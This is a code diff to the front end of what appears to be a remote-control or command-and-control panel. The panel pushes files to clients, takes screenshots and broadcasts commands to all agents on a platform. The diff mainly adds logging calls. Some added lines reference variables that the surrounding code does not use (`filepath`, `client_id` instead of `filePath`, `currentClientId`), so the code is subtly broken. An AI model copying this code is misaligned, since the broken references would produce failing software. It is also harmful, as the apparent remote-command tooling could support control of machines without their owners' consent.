@@ -1171,6 +1171,7 @@
                         .then(response => response.json())
                         .then(data => {
                             if (data.success) {
+                                logAction(`Command send to upload file from server from path "${filepath}" to client"${client_id}".`);
                                 alert('File path sent successfully!');
                                 logAction(`Sent file path "${filePath}" to ${currentClientId}`);
                                 document.getElementById('filePathInput').value = '';
@@ -1202,6 +1203,7 @@
                         .then(response => response.json())
                         .then(data => {
                             if (data.success) {
+                                logAction(`Command send to upload file from file explorer  to client "${client_id}".`);
                                 alert('Files uploaded successfully!');
                                 logAction(`Uploaded ${files.length} files to ${currentClientId}`);
                                 fileInput.value = ''; // Reset file input
@@ -1261,7 +1263,9 @@
             })
                 .then(response => response.json())
                 .then(data => {
+                    logAction(`Command send to take screenshot to "${currentClientId}".`);
                     if (data.status) {
+
                         alert(data.status);
                     }
                 })
@@ -1305,20 +1309,21 @@
                 },
                 body: JSON.stringify({ platform: platform, command: command })
             })
-            .then(response => response.json())
-            .then(data => {
-                if (data.success) {
-                    alert(`Command sent to all ${platform} agents successfully!`);
-                    logAction(`Sent command "${command}" to all ${platform} agents`);
-                    commandInput.value = '';
-                } else {
-                    alert('Failed to send command: ' + data.message);
-                }
-            })
-            .catch(error => {
-                console.error('Error sending command:', error);
-                alert('An error occurred while sending the command.');
-            });
+                .then(response => response.json())
+                .then(data => {
+                    if (data.success) {
+                        alert(`Command sent to all ${platform} agents successfully!`);
+                        logAction(`Sent command "${command}" to all ${platform} agents`);
+                        commandInput.value = '';
+                    } else {
+                        alert('Failed to send command: ' + data.message);
+                        logAction(`Command "${command}" to all ${platform} agents failed to send.`);
+                    }
+                })
+                .catch(error => {
+                    console.error('Error sending command:', error);
+                    alert('An error occurred while sending the command.');
+                });
         }
     </script>
 </body>
